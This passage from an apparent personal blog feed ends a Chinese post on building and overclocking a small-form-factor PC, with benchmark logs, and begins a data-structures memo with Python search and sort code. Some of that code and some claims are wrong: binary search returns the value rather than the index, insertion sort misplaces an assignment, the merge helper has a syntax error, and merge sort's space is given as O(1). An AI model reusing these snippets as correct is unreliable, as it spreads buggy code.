height="300"></center><ul><li>硅脂：五点法</li></ul><center><img src="/posts/5200a480/4.png" height="350"></center><ul><li>之前犯了个很蠢的错误，导致以为是bios版本点不亮zen2，还跑去了电脑城一趟</li></ul><h3 id="正式装机"><a href="#正式装机" class="headerlink" title="正式装机"></a>正式装机</h3><center><img src="/posts/5200a480/5.png" height="350"></center><ul><li>自带一个开关元件和一个前置usb线头</li><li>可以看到中间的主板支架相当细，很容易被压弯</li><li>左下角有个硬盘支架，为了空间建议拆下</li></ul><center><img src="/posts/5200a480/6.png" height="300"></center><ul><li>显卡支架位置的开孔靠后，导致只能暂且用螺丝刀续命</li></ul><center><img src="/posts/5200a480/7.png" height="350"></center><p>ps:</p><ul><li>被某师傅告知软硅胶线受热易熔，不安全，遂改为用原装线。然而导致了前脸一个12cm风扇没空间装。并且线材还得用扎线带借助顶部的开孔吊起来，不然会碰到风扇。现在想来相当后悔…</li><li>整机装机步骤很重要，散热器最好最后扣上。另外在合上前面板前应检查接线和线材是否会阻碍风扇旋转。</li><li>推荐顺序：<code>拆前面板+装风扇-&gt;装后板与后板风扇-&gt;安装主板-&gt;接线并装好电源-&gt;装显卡-&gt;走线-&gt;扣上散热器-&gt;还原机箱</code></li></ul><h2 id="性能测试与超频"><a href="#性能测试与超频" class="headerlink" title="性能测试与超频"></a>性能测试与超频</h2><h3 id="基础测试"><a href="#基础测试" class="headerlink" title="基础测试"></a>基础测试</h3><p><strong>3DMark</strong></p><center><img src="/posts/5200a480/3d1.png" height="300"></center><p><strong>Cinebench R20 多核</strong></p><ul><li>版本：20.060</li><li>得分：2718pts<ul><li>相比于cinebench官网上的2652高了不少，看来体质还行</li></ul></li></ul><h3 id="内存超频"><a href="#内存超频" class="headerlink" title="内存超频"></a>内存超频</h3><ul><li>教程参考：<a href="https://www.troyqi.com/archives/836/amd%E9%94%90%E9%BE%99%E5%86%85%E5%AD%98%E8%B6%85%E9%A2%91%E8%AE%A1%E7%AE%97%E5%99%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B-dram-calculator-for-ryzen%E4%B8%8B%E8%BD%BD/">AMD锐龙内存超频计算器使用教程——DRAM Calculator for Ryzen下载 | Troy小法师</a></li></ul><center><img src="/posts/5200a480/mem.png" height="350"></center><ul><li>首先是按计算器结果冲了一波3600但失败了，感觉是tRFC给太低</li><li>后改3400，tRFC设置500，DRAM Voltage设置1.35v，FCLK设置1700，其他按照计算器结果，aida64内存压力测试15min通过</li></ul><center><img src="/posts/5200a480/mt.png" height="300"></center><h4 id="超频前后对比"><a href="#超频前后对比" class="headerlink" title="超频前后对比"></a>超频前后对比</h4><ul><li>内存带宽变大的同时延迟还降低了</li></ul><center><img src="/posts/5200a480/mc.png" height="300"></center><ul><li>Cinebench R20成绩增长50pts</li></ul><center><img src="/posts/5200a480/cb2.png" height="200"></center><h3 id="cpu超频"><a href="#cpu超频" class="headerlink" title="cpu超频"></a>cpu超频</h3><ul><li><p>教程参考：<a href="https://www.coolapk.com/feed/21948799?shareKey=MWY1ZDhiYWY2OWUzNWY3NTdhMmU~&shareUid=679322&shareFrom=com.coolapk.market_10.5.3">保姆级超频降压软件ClockTuner for Ryzen (CTR)操作指南 来自 Topxiyang - 酷安</a></p></li><li><p>本人使用的CTR版本为v1.1 Beta7，总体下来感觉还是有点不靠谱，一来测试过程漫长，二来程序本身还是Beta阶段，不够稳定，跑到4.25G时闪退了，并且当我手动超频并通过aida64测试时，用计算器跑同样的结果却不能通过…</p></li><li><p>在4.25闪退后以0.5为步长进行手动超频（bios中防掉压开到extreme），1.25v稳定4.35G，4.40G无法通过Cinebench R20；1.275V稳定4.40G。之后无论1.3v还是1.35v都无法稳定4.45G。</p><ul><li>感觉还是主板掉电or供电不足，cpu还是能轻松往上超才对</li></ul></li></ul><h4 id="超频前后对比-1"><a href="#超频前后对比-1" class="headerlink" title="超频前后对比"></a>超频前后对比</h4><ul><li>Cinebench R20 多核<ul><li>4.35G: 2891pts</li><li>4.40G: 2945pts</li></ul></li><li>相比最初增长了200pts，相比官网数据差距近300pts</li></ul><center><img src="/posts/5200a480/cb3.png" height="250"></center><ul><li>Cinebench R20 单核<ul><li>达到511pts</li></ul></li></ul><center><img src="/posts/5200a480/cb4.png" height="250"></center><ul><li><strong>在温度上，在开放平台测试时温度约为48度，装入机箱后基础温度为50度，超频后约为51度。</strong><ul><li>图没截好，将就一下</li></ul></li></ul><center><img src="/posts/5200a480/cputest.png" height="400"></center><h3 id="显卡超频"><a href="#显卡超频" class="headerlink" title="显卡超频"></a>显卡超频</h3><blockquote><p>显卡型号都带OC了，不超频咋行🐶</p></blockquote><center><img src="/posts/5200a480/msi.png" height="300"></center><p>显卡超频直接按MSI Overclock Scanner的结果拉高120hz，显卡风扇策略改为41%并重跑一遍test，烤机温度比之前上升10度，并直接最高到达79度。最终将风扇调整为45%，可以在温度和安静之间达到平衡。</p><h4 id="超频前后对比-2"><a href="#超频前后对比-2" class="headerlink" title="超频前后对比"></a>超频前后对比</h4><p><strong>3DMark</strong></p><center><img src="/posts/5200a480/3d2.png" height="300"></center><ul><li>cpu: 4400MHz，分数上涨250</li><li>gpu: 2025Mhz，分数上涨250</li></ul><p><strong>网游测试：守望先锋</strong></p><blockquote><p>在训练模式下从选出“士兵76”开始，循环击杀2Bot1猎空至第一个大招打出并使用完为止。</p><ul><li>分辨率为1080p，刷新率144Hz</li></ul></blockquote><center><img src="/posts/5200a480/ow.png" height="250"></center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">超频前</span><br><span class="line">17-01-2021, 11:35:18 Overwatch.exe benchmark completed, 4213 frames rendered in 37.015 s</span><br><span class="line">                     Average framerate  :  113.8 FPS</span><br><span class="line">                     Minimum framerate  :   97.4 FPS</span><br><span class="line">                     Maximum framerate  :  127.0 FPS</span><br><span class="line">                     1% low framerate   :  100.2 FPS</span><br><span class="line">                     0.1% low framerate :   97.0 FPS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">超频后</span><br><span class="line">17-01-2021, 11:37:54 Overwatch.exe benchmark completed, 4832 frames rendered in 40.828 s</span><br><span class="line">                     Average framerate  :  118.3 FPS</span><br><span class="line">                     Minimum framerate  :  103.8 FPS</span><br><span class="line">                     Maximum framerate  :  133.6 FPS</span><br><span class="line">                     1% low framerate   :  102.9 FPS</span><br><span class="line">                     0.1% low framerate :  100.5 FPS</span><br><span class="line"></span><br><span class="line">提升约为6帧</span><br></pre></td></tr></table></figure><p><strong>单机测试：荒野大镖客2</strong></p><blockquote><p>以大镖客2的“性能评估测试”中最后一段为起始</p><ul><li>分辨率为1080p，刷新率100Hz</li></ul></blockquote><p>超频前</p><center><img src="/posts/5200a480/rd2.png" height="250"></center><p>超频后</p><center><img src="/posts/5200a480/rd1.png" height="250"></center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">超频前</span><br><span class="line">17-01-2021, 11:58:37 RDR2.exe benchmark completed, 6204 frames rendered in 119.625 s</span><br><span class="line">                     Average framerate  :   51.8 FPS</span><br><span class="line">                     Minimum framerate  :   44.4 FPS</span><br><span class="line">                     Maximum framerate  :   72.2 FPS</span><br><span class="line">                     1% low framerate   :   41.5 FPS</span><br><span class="line">                     0.1% low framerate :   38.7 FPS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">超频后</span><br><span class="line">17-01-2021, 12:10:17 RDR2.exe benchmark completed, 6482 frames rendered in 120.656 s</span><br><span class="line">                     Average framerate  :   53.7 FPS</span><br><span class="line">                     Minimum framerate  :   46.1 FPS</span><br><span class="line">                     Maximum framerate  :   74.8 FPS</span><br><span class="line">                     1% low framerate   :   43.0 FPS</span><br><span class="line">                     0.1% low framerate :   39.6 FPS</span><br><span class="line"></span><br><span class="line">提升约为2帧</span><br></pre></td></tr></table></figure><ul><li>从评估测试结果来看超频后最低帧有较大提升</li><li>另外这两个测试中瓶颈都是cpu</li></ul><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这个箱子本来去年6月在淘宝问了店家说是停产了，等到今年1月才在咸鱼蹲到了一个二手的，还得加价买，属实不是很划算，只能说将来一定要等到箱子确定发货了再买配件…（然而虽说配件买早了导致吃了半年灰，但显卡的价格却阴差阳错涨了1k有余，也称得上是意外之喜…）</p><p>总的看来，这个箱子在设计上算是相当不错的，能在7.7L的体积下能上塔式散热，可以说是相当可以。但说来也有不满意的点：①板材一般，厚度不足，感觉随随便便就被压弯了。②做工一般，显卡开孔有问题。③走线相当困难，如果使用电源原装模组线很容易触碰到风扇扇叶。④可能说不上缺点，但一方面是限制单风扇短卡，另外还用了显卡延长线，目前是没有问题，但今后的30、40系显卡不知性能是否会有损失。</p><p>另外这套配件总体算上来性价比也不算太高，单就性能上看，保守估计相当于笔记本平台的4600H+2060（100W）左右的水平，价格也是6k5左右，笔记本还多带个键盘和屏幕，以及具备真正的可移动性。终归说来，只能说是各取所需：我有更好的屏幕与键盘，并且不喜欢游戏笔电发烫发热、风扇动不动就起飞的体验，另外游戏笔电寿命短，贬值快（尤其是这几年AMD、Nvidia发力），虽然我这套设备较贵，但体验会更好，能安安稳稳用个五六年，等到再换时就能省一笔配件钱了。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;一直想组装一台便携的gaming pc，而笔记本的性能释放、寿命与性价比也是令人捉急，于是最终敲定组装sffpc。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标：10L以内。&lt;/li&gt;
&lt;li&gt;预算：6k左右&lt;/li&gt;
&lt;li&gt;性能：守望先锋、战地一等网游在1080p下能有144hz；刺客信条、大镖客2等单机在60帧的基础上有不错的画质&lt;ul&gt;
&lt;li&gt;可能的话还会用于编程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;体验：安静、在itx标准下尽量低温&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h2&gt;&lt;center&gt;&lt;img src=&quot;/posts/5200a480/1.png&quot; height=&quot;350&quot;&gt;&lt;/center&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;目录&lt;/th&gt;
&lt;th&gt;配件&lt;/th&gt;
&lt;th&gt;价格&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;主板&lt;/td&gt;
&lt;td&gt;Gigabyte B450i&lt;/td&gt;
&lt;td&gt;见下&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CPU&lt;/td&gt;
&lt;td&gt;AMD R5 3500x&lt;/td&gt;
&lt;td&gt;板U套装 1679&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;显卡&lt;/td&gt;
&lt;td&gt;Gigabyte GTX 1660 SUPER MINI ITX OC&lt;/td&gt;
&lt;td&gt;1529&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;电源&lt;/td&gt;
&lt;td&gt;Cosair SF450&lt;/td&gt;
&lt;td&gt;电源模组线套装 629&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;内存&lt;/td&gt;
&lt;td&gt;Klevv CJR DDR4-2666 x2&lt;/td&gt;
&lt;td&gt;339&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;固态硬盘&lt;/td&gt;
&lt;td&gt;Kioxia RC10 250G&lt;/td&gt;
&lt;td&gt;345&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cpu散热&lt;/td&gt;
&lt;td&gt;Noctua NH-D9L, with second optional NF-A9&lt;/td&gt;
&lt;td&gt;490&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;机箱散热&lt;/td&gt;
&lt;td&gt;Noctua NF-A6x25 x2; Arctic P12 x2&lt;/td&gt;
&lt;td&gt;115x2; 59x2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;机箱&lt;/td&gt;
&lt;td&gt;(WARHEAD)风冷快乐盒M&lt;/td&gt;
&lt;td&gt;1000(闲鱼价，原价606)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;额外配件&lt;/td&gt;
&lt;td&gt;模组电源线; ADT R33SL显卡延长线&lt;/td&gt;
&lt;td&gt;见上; 118&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;总计&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;6480（6083）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;话说这机箱在&lt;a href=&quot;https://caseend.com/brand/warhead/&quot;&gt;CaseEnd&lt;/a&gt;上都找不到&lt;/li&gt;
&lt;li&gt;也有考虑过10400+b460i的组合，温度和供电应该会好一些，但一来是要贵个300百多，二来10400焊钎和硅脂混用摸奖，所以最后还是选了3500x+b450i&lt;/li&gt;
&lt;li&gt;现在想来，感觉SSD买小了…&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;组装&quot;&gt;&lt;a href=&quot;#组装&quot; class=&quot;headerlink&quot; title=&quot;组装&quot;&gt;&lt;/a&gt;组装&lt;/h2&gt;&lt;h3 id=&quot;开放平台点亮测试&quot;&gt;&lt;a href=&quot;#开放平台点亮测试&quot; class=&quot;headerlink&quot; title=&quot;开放平台点亮测试&quot;&gt;&lt;/a&gt;开放平台点亮测试&lt;/h3&gt;&lt;center&gt;&lt;img src=&quot;/posts/5200a480/3.png&quot; height=&quot;300&quot;&gt;&lt;/center&gt;</summary>
    
    
    
    <category term="雜玩" scheme="https://hejueyun.github.io/categories/funfair/"/>
    
    
    <category term="essay" scheme="https://hejueyun.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>数据结构备忘录</title>
    <link href="https://hejueyun.github.io/posts/361891ac/"/>
    <id>https://hejueyun.github.io/posts/361891ac/</id>
    <published>2020-09-28T12:38:15.000Z</published>
    <updated>2021-04-25T07:09:09.496Z</updated>
    
    <content type="html"><![CDATA[<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><blockquote><p>链表是一种<strong>物理存储单元上非连续、非顺序的存储结构</strong>，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。</p><p> 链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。 每个结点包括两个部分：</p><ul><li>一个是存储数据元素的<strong>数据域</strong></li><li>另一个是存储下一个结点地址的<strong>指针域</strong></li></ul></blockquote><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><p>线性查找略</p><span id="more"></span><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span>(<span class="params">array, val</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> array:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    beg = <span class="number">0</span></span><br><span class="line">    end = <span class="built_in">len</span>(array)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> beg &lt;= end:</span><br><span class="line">        mid = <span class="built_in">int</span>((beg+end)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> array[mid] == val:</span><br><span class="line">            <span class="keyword">return</span> val</span><br><span class="line">        <span class="keyword">elif</span> array[mid] &gt; val:</span><br><span class="line">            end = mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            beg = mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常值</span></span><br><span class="line"><span class="keyword">assert</span> binary_search(a, <span class="number">1</span>) == <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> binary_search(a, -<span class="number">1</span>) == -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 异常值</span></span><br><span class="line"><span class="keyword">assert</span> binary_search(<span class="literal">None</span>, <span class="number">1</span>) == -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 边界值</span></span><br><span class="line"><span class="keyword">assert</span> binary_search(a, <span class="number">0</span>) == <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="基本排序"><a href="#基本排序" class="headerlink" title="基本排序"></a>基本排序</h3><h4 id="冒泡"><a href="#冒泡" class="headerlink" title="冒泡"></a>冒泡</h4><blockquote><p>对一个数组进行<strong>n-1 轮迭代</strong>，每次比较相邻两个元素， 如果相邻的元素前者大于后者，就交换它们</p></blockquote><ul><li>时间复杂度：O(n²)</li><li>空间复杂度：O(1)</li><li>稳定性：稳定</li></ul><h4 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h4><blockquote><p>每次我们找到最小的元素插入迭代的起始位置，这样每个位置从它自己的位置开始它就是最小的了，一圈下来数组就有序了</p></blockquote><ul><li>时间复杂度：O(n²)</li><li>空间复杂度：O(1)</li><li><strong>稳定性：不稳定</strong></li></ul><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><blockquote><p>,每次挑选下一个元素插入已经排序的数组中,初始时已排序数组只有一个元素</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertion_sort</span>(<span class="params">seq</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot; 每次挑选下一个元素插入已经排序的数组中,初始时已排序数组只有一个元素&quot;&quot;&quot;</span></span><br><span class="line">  n = <span class="built_in">len</span>(seq)</span><br><span class="line">  <span class="built_in">print</span>(seq)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">    value = seq[i]    <span class="comment"># 保存当前位置的值，因为转移的过程中它的位置可能被覆盖</span></span><br><span class="line">    <span class="comment"># 找到这个值的合适位置，使得前边的数组有序 [0,i] 有序</span></span><br><span class="line">    pos = i</span><br><span class="line">    <span class="keyword">while</span> pos &gt; <span class="number">0</span> <span class="keyword">and</span> value &lt; seq[pos-<span class="number">1</span>]:</span><br><span class="line">      seq[pos] = seq[pos-<span class="number">1</span>]  <span class="comment"># 如果前边的元素比它大，就让它一直前移</span></span><br><span class="line">      pos -= <span class="number">1</span></span><br><span class="line">  seq[pos] = value    <span class="comment"># 找到了合适的位置赋值就好</span></span><br><span class="line">  <span class="built_in">print</span>(seq)</span><br></pre></td></tr></table></figure><ul><li>时间复杂度：O(n²)</li><li>空间复杂度：O(1)</li><li>稳定性：稳定</li></ul><h3 id="高级排序"><a href="#高级排序" class="headerlink" title="高级排序"></a>高级排序</h3><h4 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h4><blockquote><p>通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">array, beg, end</span>):</span></span><br><span class="line">    pivot_index = beg</span><br><span class="line">    pivot = array[pivot_index]</span><br><span class="line">    left = pivot_index + <span class="number">1</span></span><br><span class="line">    right = end - <span class="number">1</span>    <span class="comment"># 开区间，最后一个元素位置是 end-1     [0, end-1] or [0: end)，括号表示开区间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 从左边找到比 pivot 大的</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right <span class="keyword">and</span> array[left] &lt; pivot:</span><br><span class="line">            left += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> right &gt;= left <span class="keyword">and</span> array[right] &gt;= pivot:</span><br><span class="line">            right -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left &gt; right:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            array[left], array[right] = array[right], array[left]</span><br><span class="line"></span><br><span class="line">    array[pivot_index], array[right] = array[right], array[pivot_index]</span><br><span class="line">    <span class="keyword">return</span> right   <span class="comment"># 新的 pivot 位置</span></span><br></pre></td></tr></table></figure><ul><li><code>O(nlog(n))</code></li></ul><h4 id="归并"><a href="#归并" class="headerlink" title="归并"></a>归并</h4><ul><li>分解：将待排序的 n 个元素分成各包含 n/2 个元素的子序列</li><li>解决：使用归并排序递归排序两个子序列</li><li>合并：合并两个已经排序的子序列以产生已排序的答案</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span>(<span class="params">seq</span>):</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(seq) &lt;= <span class="number">1</span>:   <span class="comment"># 只有一个元素是递归出口</span></span><br><span class="line">    <span class="keyword">return</span> seq</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    mid = <span class="built_in">int</span>(<span class="built_in">len</span>(seq)/<span class="number">2</span>)</span><br><span class="line">    left_half = merge_sort(seq[:mid])</span><br><span class="line">    right_half = merge_sort(seq[mid:])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 合并两个有序的数组</span></span><br><span class="line">    new_seq = merge_sorted_list(left_half, right_half)</span><br><span class="line">    <span class="keyword">return</span> new_seq</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_sorted_list</span>(<span class="params">sorted_a, sorted_b</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot; 合并两个有序序列，返回一个新的有序序列</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  :param sorted_a:</span></span><br><span class="line"><span class="string">  :param sorted_b:</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  length_a, length_b = <span class="built_in">len</span>(sorted_a), <span class="built_in">len</span>(sorted_b)</span><br><span class="line">  a = b = <span class="number">0</span></span><br><span class="line">  new_sorted_seq = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> a &lt; length_a <span class="keyword">and</span> b &lt; length_b:</span><br><span class="line">    <span class="keyword">if</span> sorted_a[a] &lt; sorted_b[b]:</span><br><span class="line">      new_sorted_seq.append(sorted_a[a]):</span><br><span class="line">      a += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      new_sorted_seq.append(sorted_b[b])</span><br><span class="line">      b += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 最后别忘记把多余的都放到有序数组里</span></span><br><span class="line">  <span class="keyword">if</span> a &lt; length_a:</span><br><span class="line">    new_sorted_seq.extend(sorted_a[a:])</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    new_sorted_seq.extend(sorted_b[b:])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> new_sorted_seq</span><br></pre></td></tr></table></figure><ul><li>时间复杂度：O(nlog₂n)</li><li>空间复杂度：O(1)</li><li>稳定性：稳定</li></ul><h4 id="基排"><a href="#基排" class="headerlink" title="基排"></a>基排</h4><blockquote><p>基数排序的原理就是，先排元素的最后一位，再排倒数第二位，直到所有位数都排完。这里并不能先排第一位，那样最后依然是无序</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">radix_sort</span>(<span class="params">array</span>):</span></span><br><span class="line">  bucket, digit = [[]], <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(bucket[<span class="number">0</span>]) != <span class="built_in">len</span>(array):</span><br><span class="line">    bucket = [[], [], [], [], [], [], [], [], [], []]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">      num = (array[i] // <span class="number">10</span> ** digit) % <span class="number">10</span></span><br><span class="line">      bucket[num].append(array[i])</span><br><span class="line">    array.clear()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bucket)):</span><br><span class="line">      array += bucket[i]</span><br><span class="line">    digit += <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> array</span><br></pre></td></tr></table></figure><ul><li>时间复杂度：O(d(r+n))</li><li>空间复杂度：O(rd+n)</li><li>稳定性：稳定</li></ul><h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">创建一个堆 H[<span class="number">0</span>……n-<span class="number">1</span>]；</span><br><span class="line">把堆首（最大值）和堆尾互换；</span><br><span class="line">把堆的尺寸缩小 <span class="number">1</span>，并调用 shift_down(<span class="number">0</span>)，目的是把新的数组顶端数据调整到相应位置；</span><br><span class="line">重复步骤 <span class="number">2</span>，直到堆的尺寸为 <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ul><li><p>节点深度(depth): 节点对应的 level 数字    </p></li><li><p>树的高度(height): 二叉树的高度就是 level 数 + 1，因为 level 从 0开始计算的</p></li><li><p>树的宽度(width): 二叉树的宽度指的是包含最多节点的层级的节点数</p></li><li><p>树的 size：二叉树的节点总个数。</p><ul><li>一棵 size 为 n 的二叉树高度最多可以是 n，最小的高度是 